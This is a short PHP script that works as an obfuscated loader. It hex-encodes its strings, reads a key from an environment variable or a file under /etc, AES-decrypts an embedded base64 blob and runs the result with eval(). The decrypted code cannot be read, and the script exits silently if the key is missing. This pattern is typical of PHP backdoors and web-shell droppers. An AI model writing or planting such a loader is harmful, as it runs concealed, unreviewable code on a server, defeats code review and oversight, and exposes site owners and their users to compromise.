<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('WZ9vsC/fmMkRzJcCnRBy0Q==');

$c=base64_decode(

'FWZdqU9inKPQv+V8AU8MGTt3zzXvC5ZOhD4bdZlhsNAdrMjaSFCGn9yEBAAygDGNsGyc00ySzBXT' .
'CG2Q6qXdgfZVDvcwqS8fI+pF4XNZ/0XUZmJ0y4f+3FDTy/CUvuNSTXpNjZ9hyNr0f8yBBSgX3Ys/' .
'x4StXd5nvd+VTDsctH6NIo55p8/FOFpV1Z6MyGWNMCXwGCCdKc2cXzACQUIJiCZXYOmEL75GlAWc' .
'fuFuahGKsPclVzkYHbU57gglmfnd81dzGU6SP7aPgdn6SUUahPMLWqcA9OqaVwyll6XpeKHi+FeS' .
'SbhFFFJC2/D01Cty+1jH8pw6hPHgln8sNwhJA0t3C0MJ+CX+NDq6I/2MmXkAG3C2qf+pgBBnN+5z' .
'MQ8vjBie1rdR3xWUzCu+XNP1Y0BwmrS4QWyipHBuS5Za4Z8zX+jJXSbq16gULplaq3WcwMi6F5Nd' .
'fK6Fady54ao/6aHvxeFvqPjhmfLow7kGArvyK0vdYgVRIxXoPSoedUjIO5HIzo4se4N09H7qkOSb' .
'koR7mphMp74gIwoNzPoxNRo='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

